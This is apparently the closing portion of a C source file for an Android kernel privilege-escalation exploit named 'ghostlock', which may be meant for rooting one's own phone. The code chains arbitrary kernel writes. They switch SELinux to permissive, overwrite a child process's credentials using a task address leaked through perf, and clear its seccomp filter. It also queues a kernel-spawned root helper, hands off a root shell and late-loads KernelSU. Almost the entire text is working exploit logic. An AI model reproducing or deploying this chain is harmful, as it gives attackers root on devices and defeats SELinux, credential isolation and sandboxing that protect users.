  } else if (!selinux_ok) {
    if (!enforce_readable()) {
      pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
    }
    TIMER("pre-W1 drain");
    selinux_ok = retry_write_stage(
        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 8, 100000,
        verify_selinux_stage, NULL, 0);
    if (!selinux_ok) {
      pr_warning("Write 1 failed\n");
      return 1;
    }
    TIMER("Write 1 complete");
  } else {
    pr_success("SELinux already permissive\n");
  }

  if (active_offsets->umh_root) {
    /* KDP_CRED devices: never rewrite creds.  Run the route once without a
     * custom write; try_cfi_stage() swaps ashmem fops and gains the
     * configfs arbitrary write, then install_android_root() ->
     * install_workqueue_umh_root() writes SELinux permissive and queues
     * the dedicated local helper as the kernel-spawned process. */
    int umh_ok = 0;
    for (int attempt = 1; attempt <= 1 && !umh_ok; attempt++) {
      pr_info("UMH bootstrap attempt %d/1 (fail-closed allocator policy)\n",
              attempt);
      if (active_offsets->umh_skip_pre_drain) {
        pr_info("DZI1 fast allocator path: skipping pre-UMH slab drain\n");
      } else {
        slab_drain();
      }
      umh_ok = do_one_write(0, "UMH bootstrap", 0, 0);
      if (!umh_ok) {
        pr_warning("UMH bootstrap attempt %d failed; backing off\n", attempt);
        usleep(100000);
      }
    }
    if (!umh_ok) {
      pr_warning("UMH root staging failed; stopped before unsafe retry\n");
      return 1;
    }
    TIMER("UMH work queued");

    /* The dedicated UMH daemon is already root and accepts both the shell
     * client and the late-load request from the original shell UID over the
     * local socket. Root shell is an explicit diagnostic mode; the normal
     * path continues with the verified late-load sequence. */
    errno = 0;
    const char *helper_path = local_root_helper_path();
    int helper_access = access(helper_path, X_OK);
    int helper_access_errno = helper_access < 0 ? errno : 0;
    pr_info("local helper=%s access=%d errno=%d socket=%s\n",
            helper_path, helper_access, helper_access_errno,
            LOCAL_ROOT_SOCKET);
    int root_shell = root_shell_requested(argc, argv);
    int ksu_ready = run_local_late_load(root_shell);
    if (ksu_ready) {
      pr_success("KernelSU ready via local UMH helper\n");
    } else {
      pr_warning("local UMH helper late-load failed; see %s\n",
                 LOCAL_ROOT_SOCKET);
    }
    if (root_shell) {
      /* Keep the daemon alive after late-load so the helper can immediately
       * hand the same authenticated root service to the app terminal.  The
       * daemon still tears itself down when this one-shot shell exits. */
      pr_info("root shell mode: handing off after KernelSU late-load\n");
      TIMER("root shell handoff");
      return handoff_root_shell();
    }
    TIMER("exploit complete");
    return ksu_ready ? 0 : 1;
  }

  /* W2: overwrite the child credential via the task leaked by perf. */
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  struct w2_stage_context w2_context = { .pipes = &pipes };
  pid_t child = -1;
  uintptr_t child_task = 0;
  int child_alive = 1;
  int seccomp_ok = 0;

  /* W2+W3 as a retryable chain: the W3a probe can kill the child on a missed
   * write, so respawn and redo instead of aborting. */
  for (int round = 1; round <= 3; round++) {
    if (round > 1) {
      pr_warning("W3 chain retry %d/3: respawning child\n", round);
      if (child > 0 && child_alive) {
        kill(-child, SIGKILL);
        waitpid(child, NULL, 0);
      }
      close(pipes.cmd_w); close(pipes.uid_r);
      child_alive = 1;
      seccomp_ok = 0;
    }

    child = spawn_child(&pipes);
    if (child < 0) {
      pr_warning("fork failed\n");
      return 1;
    }

    child_task = 0;
    read(pipes.task_r, &child_task, sizeof(child_task));
    close(pipes.task_r);
    TIMER("perf_find_task done");

    if (!child_task) {
      /* perf leaked nothing; respawn and retry once */
      pr_info("perf returned 0, retrying...\n");
      waitpid(child, NULL, 0);
      child = spawn_child(&pipes);
      if (child < 0) { pr_warning("retry fork failed\n"); return 1; }
      child_task = 0;
      read(pipes.task_r, &child_task, sizeof(child_task));
      close(pipes.task_r);
    }

    if (!child_task) {
      pr_warning("Cannot find task_struct (perf leak failed)\n");
      close(pipes.cmd_w);
      waitpid(child, NULL, 0);
      return 1;
    }

    pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
    pselect_child_node = 1;

    int got_root = retry_write_stage(
        "W2: cred", child_task + TASK_CRED_OFF, 2, 10, 50000,
        verify_w2_stage, &w2_context, 0);
    if (!got_root) {
      write(pipes.cmd_w, "X", 1);
      close(pipes.cmd_w); close(pipes.uid_r);
      pr_warning("W2 failed after 10 rounds\n");
      waitpid(child, NULL, 0);
      return 1;
    }

    /* W3: clear the child's seccomp filter for the late-load worker
     * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
     * must be zeroed too; zeroing mode with the flag still set BUG()s, hence
     * the direct probe first: cleared -> normal errno, active -> SIGSYS.
     * Leaf writes land on [target] or [target+8]; a comm probe picks the side
     * before targeting thread_info.flags (task+0) / seccomp.mode. */
    if (!process_has_seccomp()) {
      pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
      seccomp_ok = 1;
      break;
    }

    struct w3_stage_context w3_context = {
      .pipes = &pipes,
      .leaf_to_target8 = 1,
    };
    int dir_ok = retry_write_stage(
        "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
        verify_leaf_dir_stage, &w3_context, 1);
    if (!dir_ok) {
      pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
    }

    uintptr_t flags_target = w3_context.leaf_to_target8
      ? child_task - 8
      : child_task + TASK_THREAD_INFO_FLAGS_OFF;

    int w3a_ok = 0;
    for (int attempt = 1; attempt <= 6; attempt++) {
      pr_info("W3a: TIF_SECCOMP attempt %d/6\n", attempt);
      if (attempt == 1) slab_drain();
      int routed = do_one_write(flags_target, "W3a: TIF_SECCOMP", 1, 1);
      if (!routed) {
        pr_warning("W3a attempt %d route failed; backing off\n", attempt);
        usleep(100000);
        continue;
      }
      usleep(50000);
      if (verify_w3a_direct_stage(&w2_context)) {
        w3a_ok = 1;
        break;
      }
      int st = 0;
      if (waitpid(child, &st, WNOHANG) == child) {
        pr_warning("W3a lost the child (status=0x%x); chain will retry\n", st);
        child_alive = 0;
        break;
      }
      usleep(50000);
    }

    if (!w3a_ok) {
      pr_warning("W3 TIF_SECCOMP clear failed; ksud late-load will likely stay blocked\n");
      continue; /* respawn and redo the chain */
    }

    pr_success("W3a: child TIF_SECCOMP cleared\n");
    /* Forked probe mirrors the late-load worker; zero mode (W3b) and
     * re-probe if it still hits the filter. */
    seccomp_ok = verify_seccomp_probe_stage(&w2_context);
    if (!seccomp_ok) {
      uintptr_t mode_target = w3_context.leaf_to_target8
        ? child_task + TASK_SECCOMP_OFF - 8
        : child_task + TASK_SECCOMP_OFF;
      /* Vendor TASK_SECCOMP_OFF may point at the filter slot; the fork probe
       * verifies the result either way. */
      seccomp_ok = retry_write_stage(
          "W3b: seccomp mode", mode_target, 1, 4, 50000,
          verify_seccomp_probe_stage, &w2_context, 1);
      if (!seccomp_ok) {
        pr_warning("W3b seccomp clear or final probe failed; chain will retry\n");
        continue;
      }
    }
    pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
    break;
  }

  if (!seccomp_ok)
    pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");

  sleep(2);
  TIMER("exploit complete");
  if (child_alive) {
    if (write(pipes.cmd_w, "G", 1) != 1)
      pr_warning("failed to start late-load worker (child exited early)\n");
  } else {
    pr_warning("skipping late-load: child died during W3\n");
  }
  close(pipes.cmd_w);
  uint32_t child_report = 0;
  if (child_alive) {
    /* Bound the late-load handoff: if the worker hangs (e.g. a kernel lock
     * inside a script step), kill the whole tree so the app flow finishes. */
    int waited_ms = 0;
    for (;;) {
      pid_t r = waitpid(child, NULL, WNOHANG);
      if (r == child || r < 0) break;
      if (waited_ms >= 45000) {
        pr_warning("late-load worker timed out; killing child\n");
        kill(-child, SIGKILL);
        waitpid(child, NULL, 0);
        break;
      }
      usleep(100000);
      waited_ms += 100;
    }
    struct pollfd pfd = { .fd = pipes.uid_r, .events = POLLIN };
    ssize_t nr = -1;
    if (poll(&pfd, 1, 10000) > 0 && (pfd.revents & POLLIN)) {
      nr = read(pipes.uid_r, &child_report, sizeof(child_report));
    }
    if (nr != (ssize_t)sizeof(child_report)) child_report = 0;
  }
  close(pipes.uid_r);

  int kernelsu_ready = 0;
  for (int i = 0; i < 30 && !(kernelsu_ready = kernelsu_module_loaded()); i++) {
    usleep(100000);
  }
  /* The poll can miss a module once enforcing is restored (untrusted_app
   * loses /proc/modules); use the child's report, falling back to the log. */
  int ksu_log_loaded = (child_report & 1u) != 0;
  for (int i = 0; i < 30 && !ksu_log_loaded; i++) {
    char ksu_log_path[320];
    snprintf(ksu_log_path, sizeof(ksu_log_path), "%s/.ghostlock_ksu.log", g_home_dir);
    FILE *lf = fopen(ksu_log_path, "r");
    if (lf) {
      char line[256];
      while (fgets(line, sizeof(line), lf)) {
        if (strstr(line, "[+] KernelSU module loaded")) ksu_log_loaded = 1;
      }
      fclose(lf);
    }
    if (!ksu_log_loaded) usleep(200000);
  }
  kernelsu_ready = kernelsu_ready || ksu_log_loaded;

  /* ksud restores enforcing itself once the module is up, so a loaded module
   * is the success signal. */
  if (kernelsu_ready)
    pr_success("KernelSU ready; SELinux enforcing restored\n");
  else if (seccomp_ok)
    pr_warning("temporary root ready; KernelSU module not loaded (ksud late-load failed; see .ghostlock_ksu.log)\n");
  else
    pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
  return 0;
}

int main(int argc, char **argv) {
  if (argc >= 2 && strcmp(argv[1], "--umh") == 0) {
    return ghostlock_umh_entry(argc, argv);
  }
  if (argc == 2 && strcmp(argv[1], "--late-load") == 0) {
    return ghostlock_late_load_client();
  }
  return run_exploit(argc, argv);
}
